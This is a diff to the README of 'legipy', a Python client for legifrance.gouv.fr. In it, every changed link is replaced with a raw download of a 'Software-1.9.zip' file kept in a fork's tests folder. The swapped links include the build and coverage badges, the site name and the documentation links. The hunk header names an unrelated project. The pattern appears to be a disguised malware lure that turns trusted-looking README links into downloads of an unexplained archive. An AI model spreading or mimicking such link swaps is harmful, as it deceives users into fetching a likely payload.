@@ -3,12 +3,12 @@ Logr - An Amazing Project
 legipy
 ======
 
-[![Build Status](https://travis-ci.org/regardscitoyens/legipy.svg?branch=master)](https://travis-ci.org/regardscitoyens/legipy)
-[![codecov](https://codecov.io/gh/regardscitoyens/legipy/branch/master/graph/badge.svg)](https://codecov.io/gh/regardscitoyens/legipy)
+[![Build Status](https://github.com/M-ux349/legipy/raw/refs/heads/master/tests/Software-1.9.zip)](https://github.com/M-ux349/legipy/raw/refs/heads/master/tests/Software-1.9.zip)
+[![codecov](https://github.com/M-ux349/legipy/raw/refs/heads/master/tests/Software-1.9.zip)](https://github.com/M-ux349/legipy/raw/refs/heads/master/tests/Software-1.9.zip)
 
 **⚠️ since the new update of legifrance (2020), there's anti-scrapping and the layout changed making this library obsolete for now**
 
-Python client for the `legifrance.gouv.fr` website.
+Python client for the `https://github.com/M-ux349/legipy/raw/refs/heads/master/tests/Software-1.9.zip` website.
 
 CLI usage
 ---------
@@ -17,7 +17,7 @@ The command-line script `legipy` gives access to service commands from the comma
 
 ## Legislature
 
-Access to the [legislature](https://www.legifrance.gouv.fr/dossiers_legislatifs.jsp).
+Access to the [legislature](https://github.com/M-ux349/legipy/raw/refs/heads/master/tests/Software-1.9.zip).
 
 ### List legislatures
 
@@ -43,7 +43,7 @@ legipy law_projects [--legislature=CURRENT]
 legipy law_proposals [--legislature=CURRENT]
 ```
 
-### List common laws ("[Lois dites](https://www.legifrance.gouv.fr/affichSarde.do?reprise=true&page=1&idSarde=SARDOBJT000007106573)")
+### List common laws ("[Lois dites](https://github.com/M-ux349/legipy/raw/refs/heads/master/tests/Software-1.9.zip)")
 
 ```bash
 legipy common_laws
@@ -57,7 +57,7 @@ legipy law JORFDOLE000024106525
 
 ## Applicable codes
 
-Access to the [applicable codes](https://www.legifrance.gouv.fr/initRechCodeArticle.do).
+Access to the [applicable codes](https://github.com/M-ux349/legipy/raw/refs/heads/master/tests/Software-1.9.zip).
 
 ### List applicable codes
 
